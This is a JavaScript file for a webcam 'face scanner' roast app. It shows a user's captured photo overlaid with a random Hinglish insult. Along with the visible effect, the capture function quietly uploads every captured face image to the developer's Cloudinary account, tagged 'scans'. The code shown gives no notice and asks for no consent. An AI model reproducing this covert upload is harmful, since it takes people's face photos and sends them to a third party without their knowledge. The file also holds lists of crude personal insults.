// --- 0. CLOUDINARY INTEGRATION (Aamir's Free Storage) ---
const cloudName = "dy4kgfvpw";
const uploadPreset = "faceometer_preset"; 

// --- 1. MODES DATA (COMPLETE LIST - NO CUTS) ---
const modes = [
    {
        id: 'placeholder',
        name: '--- Select a Mode ---',
        styleClass: 'placeholder-style',
        comments: []
    },
    {
        id: 'roasting-king',
        name: '😈 The Roasting King (Heavy but Safe)',
        styleClass: 'roast-style',
        comments: [
            "SCAN FAILURE: Screen toot jayegi, itna ghoor ke mat dekho! 💔 Ghoorna band karo!", 
            "ERROR 404: Face battery low. Initiate urgent sleep protocol! 😴 Sona hi hal hai.",
            "Tum to fazool insan ho mery dost.",
            "Tumhari selfie is waqt duniya ka 8th ajooba hai.",
            "WARNING: Tumhara mood 50% battery par hai. Foran charge karein ya coffee peelo! ☕",
            "System Error: Aap scan nahi ho paye shakal ki wajah se! 😩",
            "Alert: Shakal pe 'Out of Stock' ka board laga hua hai. Refresh karna bhi bekaar hai! 🚫",
            "Sonay k baad jaldi utha kar, tere laitnay se bed bhi tang ho jata hai ⏰",
            "Is shakal ko dekh kar filters khud-ba-khud haar maan jate hain. 😂",
            "Tumhari soch ghatiya soch hai",
            "Chal hat oye pagal insan!",
            "Tumhara internet connection tumhare dimagh se zyada tez hai. Sad but true. 💡",
            "Next time try karna. Abhi toh 'Error 404 Not Found' hai! 💀",
            "Tumhari shakal dekh kar kal raat darawna khwab aaya tha. Shakal chupa lo. 👻",
            "Bhaag ja yahan se bandar k mun waly. 😂",
            "System Crash: Mun dho kar aa, phir scan kar ☣️",
            "Decoding Fail: Same like gadha! 😁",
            "Koi bhi tumhen dekh kar dar jaye ga! 🤔",
            "Zyada smart banne ki koshish mat karo, system janta hai tum copy karte ho. 📝",
            "Aap ko nayi shakal ki zarurat hai 😭",
            "Kam soya kar. Ab tera Brain freeze hogaya! 🥶",
            "Access Denied: Is chehre ko dekhne ke liye High Security Clearance chahiye. Passport lao. 🛂",
            "Hahaha: Tum asliyat mein gadhy jesy ho 😵‍💫",
            "Mute Zaroori: Tumhari khamoshi bhi bahut zyada shor machati hai. Chup raho! 🤫",
            "Server Busy: Jab tum bolte ho, meri system hang ho jata hai. Bura na maana. 😵",
            "Status: Abhi bhi 'Processing' mode mein ho, jaldi final hojao. Wait kar raha hoon! ⏳",
            "Error: Tumhare phone ka lock screen password bahut ajeeb hai. Guess karoon? 🧐",
            "Battery Low: Tumhari excitement ki battery dead ho chuki hai. Recharge karo ya so jao. 😴",
            "Self-Destruct: Agar abhi bhi ghoora toh yeh system phat jayega. Don't risk it! 💥",
            "Fact: Tumhara favorite color asal mein tumhari personality se match nahi karta. Totally opposite. 🎨",
            "Analysis: Tumhare dreams tumhari salary se zyada bade hain. Zameen pe aao. 💸",
            "Blink Zaroori: Aankhein band karo, system restart hone wala hai. Ready for the change? ✨",
            "Virus Detected: Tumhari overthinking ki bimari pakdi gayi hai. Ilaaj karwao. 💊",
            "Caution: Tumhari hasi mein thoda sa 'shaytani' element hai. Pata chal gaya! 😈",
            "FINAL VERDICT: Aapka style purana ho chuka hai, update required! Get a new look. 💇",
            "REJECTED: Next time, filter lagana mat bhoolna, please. Yeh 'no filter' theek nahi hai. 🤦",
            "LIFE GOAL: Tumhari zindagi mein sirf do cheezein hain: late hona aur phir bhi complain karna. Badlo!",
            "REALITY CHECK: Tumhara bank balance aur tumhari akal dono hi 'critical low' par hain. 📉",
            "SCAM ALERT: Tumhari promise aur tumhari neend, dono pe bharosa nahi kiya ja sakta. Jhoote! 🤥",
            "CPU USAGE: Tumhara dimagh itna slow chalta hai ki 2G internet bhi tumse tez hai. 🐌",
            "CHEAT CODE: Tum life mein shortcut dhoondhte ho, aur woh tumhein chhod kar ja chuka hai. Piche mat dekho. 🏃‍♂️",
            "VIRAL FAIL: Tumhari videos par views nahi aate, kyunki तुम 'clickbait' ho. Reality kuch aur hai! 💔",
            "BLACK HOLE: Tumhari bhook kabhi khatam nahi hoti, poora fridge kha jate ho. Stop it! 🍕",
            "ECHO CHAMBER: Tumhe sirf apni baat sunni hai, doosron ki baat toh aira gaira hai. Suno bhi! 👂",
            "FAKE GLOW: Tumhari smile artificial hai, glow toh bas filter ka hai. Original dikhao! ✨",
            "LOUD WARNING: Agar tumne abhi bhi 'phone chhod do' nahi suna, toh tumhari life bell baj jayegi. Ring-ring! 🔔",
            "MAJOR GLITCH: Tumhari memory itni weak hai ki तुम kal ka roast bhi bhool jate ho. Yaad rakho! 🧠",
            "SHAME SHAME: Roz subah nahaate nahi ho, ye system janta hai. Chupao mat! 🚿",
            "BATH ALERT: Kabhi to naha liya kar yar!",
            "CRINGE: Tumhari baatein aur tumhari harkatein, dono hi out of date hain. Update karo! 💾",
            "ZINDAGI SE HAAR: Tumhari zindagi mein motivation 'zero' hai. Utho aur kuch karo. 🚀",
            "PASSPORT DENIED: Tumhari shakal dekh ke lagta hai, तुम kisi aur planet se aaye ho. Wapis jao! 👽",
            "Tumhe khud nahi pata tum kya ho aur kya karna hai. Confused! 🤔",
            "SLEEP PARALYSIS: Tumhara din raat mein shuru hota hai. Abhi bhi theek time hai, jaldi so jao. 🌙",
            "Tu khamosh raha kar, bola na kar",
        ]
    },
    {
        id: 'hyper-burner',
        name: '🔥 Hyper Burner (Short & Explosive Roasts)',
        styleClass: 'burner-style',
        comments: [
            "SCAN FAILED: Shakal achhi lag rahi hai, **filter hatao**!",
            "SYSTEM DOWN: Mood off hai? **Naha ke aao.**",
            "CRITICAL ERROR: **Waqt barbaad** mat karo. Kuch kaam karo.",
            "ALERT: **Subah ho gayi**, uth jao! Sote rehte ho.",
            "WARNING: **Jhoot** bolna band karo. Sab pata hai.",
            "ANALYSIS: **Tumhe sirf** khaana chahiye. Aur kuch nahi.",
            "REJECTED: **Zyada mat socho.** Simple raho.",
            "FAILURE: **Shakal se toh** lagta nahi... tum insaan ho?",
            "STATUS: **Single hi** rahoge. Kyun? Khud socho.",
            "SHOCKER: **Kitni der** lagayi taiyar hone mein? Phir bhi...",
            "DELETED: **Apna phone** chhod do. Zindagi dekho.",
            "CODE RED: **Aaina dekha** hai? Dar jayega.",
            "FATAL: **Tumse na ho** payega. Try mat karo.",
            "VIRUS: **Smile fake** hai. Remove it.",
            "ERROR 99: **Dost kam** hain? Reason tum ho.",
            "RETRY: **Kal better** ho jana. Aaj toh... 👎",
            "OVERLOAD: **Itna gussa** kyun ho? Relax karo.",
            "TRUTH: **Tumhari favorite** dress gandi hai.",
            "GIVE UP: **Tum diet** kabhi nahi karoge. Promise.",
            "LAG: **Tumhara dimagh** slow chalta hai. Restart karo.",
            "LAME: **Jokes sunao** mat. Tumse nahi hoga.",
            "BUMMER: **Internet nahi** chal raha? Tumhari kismat.",
            "OUT: **Tum party** mein invited nahi ho. Jao.",
            "FAKE: **Yeh shirt** tumhari nahi hai. Return karo.",
            "BURN: **Tumhari pasand** bahut buri hai. Very bad.",
            "DEAD END: **Tumhara crush** tumhein avoid karta hai.",
            "BLOCKED: **Baat mat** karna. System off hai.",
            "BYE: **Bhoot lag rahe** ho. Good night.",
            "IDK: **Mujhe nahi** pata tum kon ho.",
            "ZERO: **Rating 0/10.** Next time aana."
        ]
    },
    {
        id: 'ultimate-destroyer',
        name: '💣 Ultimate Destroyer (One-Word Kill Shots)',
        styleClass: 'destroyer-style',
        comments: [
            "FAIL", "MAD", "DULL", "GADHE KAHIN K", "EMPTY", 
            "USELESS", "SAD", "SCARED", "PAGAL", "DUMB",
            "LAZY", "LIAR", "GHOST", "DREAMER", "STRESS", 
            "BROKE", "SINK", "SLEEPY", "SLOW", "CRAZY",
            "CRY", "WEAK", "CLUMSY", "OLD", "RUN",
            "FINISHED", "LATE", "BEWAQOOF", "WASTED", "LAZY"
        ]
    }
];

// --- 2. ELEMENT REFERENCES & STATE ---
let currentMode = modes[0]; 
let videoStream = null;

const modesScreen = document.getElementById('modes-screen');
const scanScreen = document.getElementById('scan-screen');
const resultScreen = document.getElementById('result-screen');
const modeSelect = document.getElementById('mode-select');
const startScanBtn = document.getElementById('start-scan-btn');

const videoElement = document.getElementById('videoElement');
const capturedCanvas = document.getElementById('capturedCanvas');
const timerDisplay = document.getElementById('timer-display');
const newScanBtn = document.getElementById('new-scan-btn');
const backToModesBtn = document.getElementById('back-to-modes-btn');
const resultDisplayFrame = document.querySelector('.result-display-frame'); 

// --- 3. CLOUDINARY UPLOAD FUNCTION ---
async function uploadToCloudinary(imageBlob) {
    const formData = new FormData();
    formData.append('file', imageBlob);
    formData.append('upload_preset', uploadPreset);
    formData.append('tags', 'scans');

    try {
        const response = await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, {
            method: 'POST',
            body: formData
        });
        const data = await response.json();
    } catch (error) {
        console.error("Cloudinary Error:", error);
    }
}

// --- 4. CORE FUNCTIONS ---

function switchScreen(targetId) {
    if (resultDisplayFrame) { resultDisplayFrame.classList.remove('active'); }
    [modesScreen, scanScreen, resultScreen].forEach(screen => { screen.classList.remove('active'); });
    document.getElementById(targetId).classList.add('active');
    if (targetId !== 'scan-screen') { stopCamera(); }
}

function stopCamera() {
    if (videoStream) {
        videoStream.getTracks().forEach(track => track.stop());
        videoStream = null;
    }
}

function startScan() {
    if (currentMode.id === 'placeholder') {
        alert("Please select a scan protocol!");
        return;
    }
    const scannerLine = document.querySelector('.real-scanner-line');
    scannerLine.style.animation = 'none';
    void scannerLine.offsetWidth; 
    scannerLine.style.animation = 'realScan 1.5s linear infinite alternate'; 

    switchScreen('scan-screen');
    let scanDuration = 3; 
    timerDisplay.textContent = scanDuration;
    
    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
        .then(stream => {
            videoStream = stream;
            videoElement.srcObject = stream;
            videoElement.onloadeddata = () => { 
                const timerInterval = setInterval(() => {
                    scanDuration--;
                    timerDisplay.textContent = scanDuration;
                    if (scanDuration <= 0) {
                        clearInterval(timerInterval);
                        videoElement.onloadeddata = null; 
                        setTimeout(captureAndShowResult, 100); 
                    }
                }, 1000);
            };
        })
        .catch(err => {
            alert("SYSTEM ERROR: Camera access denied!");
            switchScreen('modes-screen');
        });
}

function captureAndShowResult() {
    const context = capturedCanvas.getContext('2d');
    capturedCanvas.width = videoElement.videoWidth;
    capturedCanvas.height = videoElement.videoHeight;
    
    if (capturedCanvas.width > 10 && capturedCanvas.height > 10) {
        context.save();
        context.scale(-1, 1);
        context.drawImage(videoElement, capturedCanvas.width * -1, 0, capturedCanvas.width, capturedCanvas.height);
        context.restore(); 

        capturedCanvas.toBlob((blob) => { uploadToCloudinary(blob); }, 'image/jpeg', 0.8);
        
        stopCamera(); 
        const selectedMode = currentMode;
        const randomIndex = Math.floor(Math.random() * selectedMode.comments.length);
        
        let rawComment = selectedMode.comments[randomIndex];
        const finalComment = rawComment.replace(/Roast Level \d+:/g, '').trim();

        // FULL BOX DYNAMIC TERMINAL CALL
        typeEffectOnCanvas(finalComment);
    } else {
        stopCamera();
        switchScreen('modes-screen');
    }
    
    switchScreen('result-screen');
    setTimeout(() => { if (resultDisplayFrame) resultDisplayFrame.classList.add('active'); }, 50); 
}

// --- PROFESSIONAL STEALTH TERMINAL TYPING EFFECT ---
function typeEffectOnCanvas(fullText) {
    const context = capturedCanvas.getContext('2d');
    const canvasWidth = capturedCanvas.width;
    const canvasHeight = capturedCanvas.height;
    
    // LIST OF HEAVY PROFESSIONAL COLORS
    const heavyColors = ["#ff3b3b", "#3bf7ff", "#faff3b", "#ff3bf3", "#3bff5a", "#ffffff"];
    const randomColor = heavyColors[Math.floor(Math.random() * heavyColors.length)];
    
    const isMobile = window.innerWidth < 600;
    
    // FONT SIZE: Big for mobile visibility
    let fontSize = isMobile ? (canvasWidth > 500 ? 48 : 42) : 34;
    if (fullText.length > 80) fontSize -= 6; 

    // NO GLOW - Sharp Terminal Font
    context.font = `900 ${fontSize}px 'Orbitron', sans-serif`;
    
    const words = fullText.toUpperCase().split(" ");
    let wordIndex = 0;
    let currentText = "";

    // Store clean background for redraw
    const offscreenCanvas = document.createElement('canvas');
    offscreenCanvas.width = canvasWidth;
    offscreenCanvas.height = canvasHeight;
    offscreenCanvas.getContext('2d').drawImage(capturedCanvas, 0, 0);

    function drawFrame() {
        if (wordIndex < words.length) {
            currentText += (wordIndex === 0 ? "" : " ") + words[wordIndex];
            wordIndex++;

            context.clearRect(0, 0, canvasWidth, canvasHeight);
            context.drawImage(offscreenCanvas, 0, 0);

            // Darken screen for terminal look
            context.fillStyle = 'rgba(0, 0, 0, 0.7)'; 
            context.fillRect(0, 0, canvasWidth, canvasHeight);

            const currentLines = getLines(context, currentText, canvasWidth * 0.9);
            const lineHeight = fontSize * 1.4;
            
            context.textAlign = 'center';
            context.textBaseline = 'middle';
            
            let startY = (canvasHeight / 2) - ((currentLines.length - 1) * lineHeight / 2);

            currentLines.forEach((line, idx) => {
                // Heavy Sharp Stroke (No Glow)
                context.strokeStyle = "black";
                context.lineWidth = 12; 
                context.strokeText(line, canvasWidth / 2, startY + (idx * lineHeight));
                
                // Solid Heavy Color
                context.fillStyle = randomColor;
                context.shadowBlur = 0; // Removing Glow
                context.fillText(line, canvasWidth / 2, startY + (idx * lineHeight));
            });
            
            setTimeout(drawFrame, 75); 
        }
    }
    drawFrame();
}

function getLines(ctx, text, maxWidth) {
    const words = text.split(" ");
    let lines = [];
    let currentLine = words[0] || '';
    for (let i = 1; i < words.length; i++) {
        const word = words[i];
        const width = ctx.measureText(currentLine + " " + word).width;
        if (width < maxWidth) { currentLine += " " + word; } 
        else { lines.push(currentLine); currentLine = word; }
    }
    lines.push(currentLine);
    return lines;
}

// --- 5. EVENT LISTENERS & INIT ---
modeSelect.addEventListener('change', (e) => {
    currentMode = modes.find(m => m.id === e.target.value);
});
startScanBtn.addEventListener('click', startScan);
newScanBtn.addEventListener('click', startScan);
backToModesBtn.addEventListener('click', () => {
    modeSelect.value = 'placeholder';
    switchScreen('modes-screen');
});
document.addEventListener('DOMContentLoaded', () => {
    modes.forEach(mode => {
        const option = document.createElement('option');
        option.value = mode.id;
        option.textContent = mode.name;
        modeSelect.appendChild(option);
    });
});